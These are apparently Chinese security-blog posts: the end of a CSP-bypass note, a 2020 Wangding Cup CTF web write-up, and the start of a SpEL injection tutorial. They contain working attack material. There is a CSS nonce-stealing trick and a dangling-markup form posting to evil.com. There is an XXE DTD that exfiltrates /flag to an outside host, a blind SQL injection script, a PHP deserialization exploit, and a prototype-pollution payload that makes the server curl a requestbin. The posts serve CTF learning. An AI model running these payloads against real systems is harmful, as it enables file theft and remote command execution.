<h4 id="steal-nonce"><a href="#steal-nonce" class="headerlink" title="steal nonce"></a>steal nonce</h4><h5 id="via-CSS-selectors"><a href="#via-CSS-selectors" class="headerlink" title="via CSS selectors"></a>via CSS selectors</h5><pre><code class="html">&lt;!-- XSS --&gt;
&lt;style&gt;
script { display: block }
script[nonce^=&quot;a&quot;]:after { content: url(&quot;record?a&quot;) }
script[nonce^=&quot;b&quot;]:after { content: url(&quot;record?b&quot;) }
&lt;/style&gt;
&lt;!-- End XSS --&gt;
&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre>
<p>可以联合其他标签来发出请求，如<code>&lt;a&gt;</code> …</p>
<pre><code class="html">&lt;style&gt;script[nonce^=&quot;0&quot;]~a{background:url(&quot;http://y5pwcd.ceye.io/success&quot;)}&lt;/style&gt;</code></pre>
<p>相关的css 语法</p>
<p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors</a> </p>
<p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors</a> </p>
<h5 id="via-dangling-markup-attack"><a href="#via-dangling-markup-attack" class="headerlink" title="via dangling markup attack"></a>via dangling markup attack</h5><p>破坏原有的结构，将script标签变成文本，诱使用户点击</p>
<pre><code class="html">&lt;!-- XSS --&gt; &lt;form method=&quot;post&quot; action=&quot;//evil.com/form&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;click&quot;&gt;&lt;textarea name=&quot;nonce&quot;&gt;
&lt;!-- End XSS --&gt;
&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre>
<h3 id="JS-framework-based-CSP-Bypasses"><a href="#JS-framework-based-CSP-Bypasses" class="headerlink" title="JS framework-based CSP Bypasses"></a>JS framework-based CSP Bypasses</h3><p>利用低版本JQuery等js框架漏洞来绕过csp</p>
<h2 id="绕过实例"><a href="#绕过实例" class="headerlink" title="绕过实例"></a>绕过实例</h2><h2 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a>一些工具</h2><p>检查csp: <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p>
<p>常用可控jsonp: <a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p>
<p><a href="https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa" target="_blank" rel="noopener">csp mitigator</a> :一个csp调试工具</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> [Spagnuolo_Hack In Bo - So we broke all CSPs… You won’t guess what happened next!](<a href="https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack" target="_blank" rel="noopener">https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack</a> In Bo - So we broke all CSPs… You won’t guess what happened next!.pdf) </p>
<p><a href="https://paper.seebug.org/423/" target="_blank" rel="noopener">前端防御从入门到弃坑–CSP变迁</a></p>
<h2 id="收藏"><a href="#收藏" class="headerlink" title="收藏"></a>收藏</h2><p>Bypassing CSP script nonces via the browser cache： <a href="http://sebastian-lekies.de/csp/attacker.php" target="_blank" rel="noopener">http://sebastian-lekies.de/csp/attacker.php</a></p>
<p> <a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/" target="_blank" rel="noopener">https://hurricane618.me/2018/06/30/csp-bypass-summary/</a> </p>
<p> <a href="https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/</a> </p>
<p> <a href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense" target="_blank" rel="noopener">https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense</a> </p>
<p> <a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf" target="_blank" rel="noopener">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/20/bypass_csp/">http://blog.ccreater.top/2020/05/20/bypass_csp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/05/20/bypass_csp/" data-id="ckaff54sp000014v015vi8k40" data-title="bypass_csp" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-2020年网鼎杯青龙组" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/" class="article-date">
  <time class="dt-published" datetime="2020-05-12T02:26:13.216Z" itemprop="datePublished">2020-05-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/">2020年网鼎杯青龙组</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="2020年第二届“网鼎杯”网络安全大赛青龙组"><a href="#2020年第二届“网鼎杯”网络安全大赛青龙组" class="headerlink" title="2020年第二届“网鼎杯”网络安全大赛青龙组"></a>2020年第二届“网鼎杯”网络安全大赛青龙组</h2><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h3><p>测试发现DownloadServlet存在目录穿越漏洞<br>读取web.xml，然后依次读取对应的class文件<br> <a href="http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml" target="_blank" rel="noopener">http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml</a> </p>
<p>web.xml</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;2.5&quot;&gt;
  &lt;display-name&gt;file_in_java&lt;/display-name&gt;
  &lt;welcome-file-list&gt;
    &lt;welcome-file&gt;upload.jsp&lt;/welcome-file&gt;
  &lt;/welcome-file-list&gt;
  &lt;servlet&gt;
    &lt;description&gt;&lt;/description&gt;
    &lt;display-name&gt;UploadServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet&gt;
    &lt;description&gt;&lt;/description&gt;
    &lt;display-name&gt;ListFileServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/ListFileServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet&gt;
    &lt;description&gt;&lt;/description&gt;
    &lt;display-name&gt;DownloadServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
&lt;/web-app&gt;</code></pre>
<p> <a href="http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class" target="_blank" rel="noopener">http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class</a></p>
<p> DownloadServlet</p>
<pre><code class="java">package cn.abc.servlet;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.net.URLEncoder;
import javax.servlet.RequestDispatcher;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class DownloadServlet
  extends HttpServlet
{
  private static final long serialVersionUID = 1L;

  protected void doGet(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    doPost(request, response);
  }

  protected void doPost(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    String fileName = request.getParameter(&quot;filename&quot;);
    fileName = new String(fileName.getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;);
    System.out.println(&quot;filename=&quot; + fileName);
    if ((fileName != null) &amp;&amp; (fileName.toLowerCase().contains(&quot;flag&quot;)))
    {
      request.setAttribute(&quot;message&quot;, &quot;��������&quot;);
      request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response);
      return;
    }
    String fileSaveRootPath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);

    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);

    File file = new File(path + &quot;/&quot; + fileName);
    if (!file.exists())
    {
      request.setAttribute(&quot;message&quot;, &quot;����������������������!&quot;);
      request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response);
      return;
    }
    String realname = fileName.substring(fileName.indexOf(&quot;_&quot;) + 1);

    response.setHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + URLEncoder.encode(realname, &quot;UTF-8&quot;));

    FileInputStream in = new FileInputStream(path + &quot;/&quot; + fileName);

    ServletOutputStream out = response.getOutputStream();

    byte[] buffer = new byte[&#39;?&#39;];
    int len = 0;
    while ((len = in.read(buffer)) &gt; 0) {
      out.write(buffer, 0, len);
    }
    in.close();

    out.close();
  }

  public String findFileSavePathByFileName(String filename, String saveRootPath)
  {
    int hashCode = filename.hashCode();
    int dir1 = hashCode &amp; 0xF;
    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;
    String dir = saveRootPath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2;
    File file = new File(dir);
    if (!file.exists()) {
      file.mkdirs();
    }
    return dir;
  }
}
</code></pre>
<p>UploadServlet</p>
<pre><code class="java">package cn.abc.servlet;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.util.List;
import java.util.UUID;
import javax.servlet.RequestDispatcher;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;
import org.apache.poi.openxml4j.exceptions.InvalidFormatException;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.ss.usermodel.WorkbookFactory;

public class UploadServlet
  extends HttpServlet
{
  private static final long serialVersionUID = 1L;

  protected void doGet(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    doPost(request, response);
  }

  protected void doPost(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    String savePath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);

    String tempPath = getServletContext().getRealPath(&quot;/WEB-INF/temp&quot;);
    File tempFile = new File(tempPath);
    if (!tempFile.exists()) {
      tempFile.mkdir();
    }
    String message = &quot;&quot;;
    try
    {
      DiskFileItemFactory factory = new DiskFileItemFactory();

      factory.setSizeThreshold(102400);

      factory.setRepository(tempFile);

      ServletFileUpload upload = new ServletFileUpload(factory);

      upload.setProgressListener(new UploadServlet.1(this));

      upload.setHeaderEncoding(&quot;UTF-8&quot;);

      upload.setFileSizeMax(1048576L);

      upload.setSizeMax(10485760L);
      if (!ServletFileUpload.isMultipartContent(request)) {
        return;
      }
      List&lt;FileItem&gt; list = upload.parseRequest(request);
      for (FileItem fileItem : list) {
        if (fileItem.isFormField())
        {
          String name = fileItem.getFieldName();

          String str1 = fileItem.getString(&quot;UTF-8&quot;);
        }
        else
        {
          String filename = fileItem.getName();
          if ((filename != null) &amp;&amp; (!filename.trim().equals(&quot;&quot;)))
          {
            String fileExtName = filename.substring(filename.lastIndexOf(&quot;.&quot;) + 1);

            InputStream in = fileItem.getInputStream();
            if ((filename.startsWith(&quot;excel-&quot;)) &amp;&amp; (&quot;xlsx&quot;.equals(fileExtName))) {
              try
              {
                Workbook wb1 = WorkbookFactory.create(in);
                Sheet sheet = wb1.getSheetAt(0);
                System.out.println(sheet.getFirstRowNum());
              }
              catch (InvalidFormatException e)
              {
                System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;);
                e.printStackTrace();
              }
            }
            String saveFilename = makeFileName(filename);
            request.setAttribute(&quot;saveFilename&quot;, saveFilename);
            request.setAttribute(&quot;filename&quot;, filename);

            String realSavePath = makePath(saveFilename, savePath);

            FileOutputStream out = new FileOutputStream(realSavePath + &quot;/&quot; + saveFilename);

            byte[] buffer = new byte[&#39;?&#39;];

            int len = 0;
            while ((len = in.read(buffer)) &gt; 0) {
              out.write(buffer, 0, len);
            }
            in.close();

            out.close();

            message = &quot;������������!&quot;;
          }
        }
      }
    }
    catch (FileUploadException e)
    {
      e.printStackTrace();
    }
    request.setAttribute(&quot;message&quot;, message);
    request.getRequestDispatcher(&quot;/ListFileServlet&quot;).forward(request, response);
  }

  private String makeFileName(String filename)
  {
    return UUID.randomUUID().toString() + &quot;_&quot; + filename;
  }

  private String makePath(String filename, String savePath)
  {
    int hashCode = filename.hashCode();
    int dir1 = hashCode &amp; 0xF;
    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;

    String dir = savePath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2;

    File file = new File(dir);
    if (!file.exists()) {
      file.mkdirs();
    }
    return dir;
  }
}
</code></pre>
<p>在报错中我们看到 poi-ooxml-3.10<br>谷歌下可以发现它其实是有个漏洞的<a href="https://www.cnblogs.com/iyiyang/articles/10055824.html" target="_blank" rel="noopener">https://www.cnblogs.com/iyiyang/articles/10055824.html</a></p>
<p>在服务器上放个evil.dtd,内容为：</p>
<pre><code class="xml=">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://ccreater.top:60004/?%file;&#39;&gt;&quot;&gt;
%all;
</code></pre>
<p>分别在 <code>[Content_Types].xml、/xl/workbook.xml、/xl/worksheets/shee1.xml</code>  中添加<br><code>&lt;!DOCTYPE ANY SYSTEM &quot;http://ccreater.top:60000/evil.dtd&quot;&gt;  在根元素中添加&lt;b&gt;&amp;send&lt;/b&gt;</code></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200510180925.png" alt="image9568"></p>
<p> 监听端口拿到flag</p>
<h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><pre><code class="php">&lt;?php

class FileHandler {

    public $op;
    public $filename;
    public $content;

    function __construct() {
        $op = &quot;2e0&quot;;
        $filename = &quot;flag.php&quot;;
    }

    public function set($filename) {
        $this-&gt;op = &#39;2e0&#39;;
        $this-&gt;filename = $filename;
    }
}


$url = &#39;http://5f56366ab1864e38b5d46f4b070e8082a5878207423a4008.cloudgame1.ichunqiu.com/?str=&#39;;

$file = new FileHandler;
$file-&gt;set($_GET[1]);

$payload = urlencode(serialize($file));
echo file_get_contents($url . $payload);

#echo urlencode(serialize($payload));

</code></pre>
<p>利用弱类型比较来绕过<code>if($this-&gt;op === &quot;2&quot;)$this-&gt;op = &quot;1&quot;;</code><br>将FileHandler中的变量改为public来绕过is_valid的限制<br>读取 /proc/self/cmdline 得知配置文件：<code>/web/config/httpd.conf</code><br>读取配置文件得知 web目录：<code>DocumentRoot &quot;/web/html&quot;</code><br>读取flag:<code>/web/html/flag.php</code></p>
<h3 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h3><p>只有一个register.php,fuzz方向存在sql注入漏洞<br>由于题目限制最多只能插入20个数据，于是我们让mysql在运算的时候报错就不会插入数据，避免了多次重开容器的麻烦<br>测试后，具体payload为:<code>username=&#39;,&#39;aaa&#39;-if(ascii(select substr(database(),1,1))&gt;1,sleep(5)-exp(~(select * from(select user())a)),exp(~(select * from(select user())a))))%23&amp;password=aaa</code></p>
<p>因为information_schema被过滤，还有其他的一些能够查询表名的表不存在，于是只能猜测表名</p>
<p>盲注脚本：</p>
<pre><code class="python">import requests
import time


#修改bigger和sqlinj就好


#实现bigger才能使用
def findByDichotomy(begin,end):
    max_num=end
    while True:
        mid=int((begin+end)/2)
        if begin==max_num:
            return False
        if begin==end:
            return begin
        if end-begin==1:
            if bigger(begin):
                return end
            else:
                return begin
        if bigger(mid):
            begin=mid+1
        else:
            end=mid
#待求数据大于num
def bigger(num):
    time.sleep(0.5)
    sql=&quot;select group_concat(b) from (select (select 1)a,(select 2)b union select * from flag)`table`&quot;
    burp0_url = &quot;http://2e22e4f7edf54994ae0a08c8acf108e6b85804ee8a8144c6.cloudgame2.ichunqiu.com:80/register_do.php&quot;
    burp0_cookies = {&quot;UM_distinctid&quot;: &quot;16f8014229c357-04d5c848290106-6701b35-240000-16f8014229d768&quot;, &quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1587227364&quot;, &quot;Hm_lpvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1589089931&quot;, &quot;__jsluid_h&quot;: &quot;5303c9bcf8d25c671142a156f959a817&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://2e22e4f7edf54994ae0a08c8acf108e6b85804ee8a8144c6.cloudgame2.ichunqiu.com/register.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    burp0_data = {&quot;username&quot;: &quot;&#39;,&#39;aaa&#39;-if((ascii(substr(( {sql} ),{POS},2))&gt;{GUESS}),sleep(2)-exp(~(select * from(select user())a)),exp(~(select * from(select user())a))))#&quot;.format(GUESS=num,POS=pos,sql=sql), &quot;password&quot;: &quot;aaa&quot;}
    try:
        r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=2)
    except Exception:
        return True
    print(&quot;test &quot;+str(num))
    print(r.text)
    return False
def less(num):
    pass
def equal(num):
    pass


#1,flag{}
result=&quot;2,flag{&quot;
pos=len(result)+1
while True:
    num=findByDichotomy(32,128)
    if num is False:
        print(result)
        break
    result+=chr(num)
    print(result)
    pos+=1</code></pre>
<h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><p>源代码:</p>
<pre><code class="javascript">var express = require(&#39;express&#39;);
var path = require(&#39;path&#39;);
const undefsafe = require(&#39;undefsafe&#39;);
const { exec } = require(&#39;child_process&#39;);


var app = express();
class Notes {
    constructor() {
        this.owner = &quot;whoknows&quot;;
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {&quot;author&quot;: author,&quot;raw_note&quot;:raw_note};
    }

    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + &#39;.author&#39;, author);
        undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);
    }

    get_all_notes() {
        return this.note_list;
    }

    remove_note(id) {
        delete this.note_list[id];
    }
}

var notes = new Notes();
notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#39;s first note&quot;);


app.set(&#39;views&#39;, path.join(__dirname, &#39;views&#39;));
app.set(&#39;view engine&#39;, &#39;pug&#39;);

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, &#39;public&#39;)));


app.get(&#39;/&#39;, function(req, res, next) {
  res.render(&#39;index&#39;, { title: &#39;Notebook&#39; });
});

app.route(&#39;/add_note&#39;)
    .get(function(req, res) {
        res.render(&#39;mess&#39;, {message: &#39;please use POST to add a note&#39;});
    })
    .post(function(req, res) {
        let author = req.body.author;
        let raw = req.body.raw;
        if (author &amp;&amp; raw) {
            notes.write_note(author, raw);
            res.render(&#39;mess&#39;, {message: &quot;add note sucess&quot;});
        } else {
            res.render(&#39;mess&#39;, {message: &quot;did not add note&quot;});
        }
    })

app.route(&#39;/edit_note&#39;)
    .get(function(req, res) {
        res.render(&#39;mess&#39;, {message: &quot;please use POST to edit a note&quot;});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id &amp;&amp; author &amp;&amp; enote) {
            notes.edit_note(id, author, enote);
            res.render(&#39;mess&#39;, {message: &quot;edit note sucess&quot;});
        } else {
            res.render(&#39;mess&#39;, {message: &quot;edit note failed&quot;});
        }
    })

app.route(&#39;/delete_note&#39;)
    .get(function(req, res) {
        res.render(&#39;mess&#39;, {message: &quot;please use POST to delete a note&quot;});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render(&#39;mess&#39;, {message: &quot;delete done&quot;});
        } else {
            res.render(&#39;mess&#39;, {message: &quot;delete failed&quot;});
        }
    })

app.route(&#39;/notes&#39;)
    .get(function(req, res) {
        let q = req.query.q;
        let a_note;
        if (typeof(q) === &quot;undefined&quot;) {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);
        }
        res.render(&#39;note&#39;, {list: a_note});
    })

app.route(&#39;/status&#39;)
    .get(function(req, res) {
        let commands = {
            &quot;script-1&quot;: &quot;uptime&quot;,
            &quot;script-2&quot;: &quot;free -m&quot;
        };
        for (let index in commands) {
            exec(commands[index], {shell:&#39;/bin/bash&#39;}, (err, stdout, stderr) =&gt; {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send(&#39;OK&#39;);
        res.end();
    })


app.use(function(req, res, next) {
  res.status(404).send(&#39;Sorry cant find that!&#39;);
});


app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.status(500).send(&#39;Something broke!&#39;);
});


const port = 8080;
app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:${port}`))
</code></pre>
<p>谷歌发现unsafe的某些版本存在原型链污染漏洞 <a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p>
<p>阅读代码发现可以通过edit_note来污染原型链结合status处来命令执行</p>
<p>payload:<code>id=__proto__.abc&amp;author=curl http://http.requestbin.buuoj.cn/19tjk5d1?aaaaa=1&amp;raw=ls</code></p>
<p>令我有些不解的是，我本地复现payload为：<code>id=__proto__&amp;author=curl http://http.requestbin.buuoj.cn/19tjk5d1?aaaaa=1&amp;raw=ls</code>,本地是可以的，打靶机的时候反而不行</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/12/2020年网鼎杯青龙组/">http://blog.ccreater.top/2020/05/12/2020年网鼎杯青龙组/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/" data-id="cka3ckr1s0006v4v05xso7y8g" data-title="2020年网鼎杯青龙组" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-SpEL表达式注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2020-05-06T07:13:00.196Z" itemprop="datePublished">2020-05-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SpEL表达式注入漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SpEL表达式注入漏洞"><a href="#SpEL表达式注入漏洞" class="headerlink" title="SpEL表达式注入漏洞"></a>SpEL表达式注入漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Expression Language（简称SpEL）。SpEL引擎作为Spring 组合里的表达式解析的基础 ，但它不直接依赖于Spring,可独立使用。 </p>
<h2 id="SpEL测试代码"><a href="#SpEL测试代码" class="headerlink" title="SpEL测试代码"></a>SpEL测试代码</h2><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);
//Expression randomPhrase = parser.parseExpression(&quot;123&quot;,new TemplateParserContext());
String message = (String) exp.getValue();
//String message = exp.getValue(String.class);
</code></pre>
<p> 上述代码含义为首先创建<code>ExpressionParser</code>解析表达式，之后放置表达式，最后通过<code>getValue</code>方法执行表达式，默认容器是spring本身的容器：<code>ApplicationContext</code>。 </p>
<p><code>TemplateParserContext</code>添加了 <strong>表达式模板</strong> 解析器</p>
<h2 id="SpEL语法"><a href="#SpEL语法" class="headerlink" title="SpEL语法"></a>SpEL语法</h2><h3 id="使用SpEL接口进行表达式求值"><a href="#使用SpEL接口进行表达式求值" class="headerlink" title="使用SpEL接口进行表达式求值"></a>使用SpEL接口进行表达式求值</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);
String message = (String) exp.getValue();</code></pre>
<h3 id="方法调用，访问属性，调用构造函数"><a href="#方法调用，访问属性，调用构造函数" class="headerlink" title="方法调用，访问属性，调用构造函数"></a>方法调用，访问属性，调用构造函数</h3><p>这些都和平时的java没什么不同,demo:</p>
<p>访问属性：</p>
<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;&#39;123&#39;.bytes&quot;);
System.out.println((Object)exp.getValue());</code></pre>
<p>方法调用：</p>
<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;&#39;123&#39;.length()&quot;);
System.out.println((Object)exp.getValue());</code></pre>
<p>调用构造函数：</p>
<pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(&quot;new String(1234)&quot;);
System.out.println((Object)exp.getValue());</code></pre>
<h3 id="访问根对象属性方法等"><a href="#访问根对象属性方法等" class="headerlink" title="访问根对象属性方法等"></a>访问根对象属性方法等</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(&quot;fucker+tou()&quot;);
        System.out.println((Object)exp.getValue(new Object(){
            public String fucker=&quot;fucker&quot;;
            public String tou(){
                return &quot;toutoutou&quot;;
            };
        }));</code></pre>
<p>结果：<code>fuckertoutoutou</code></p>
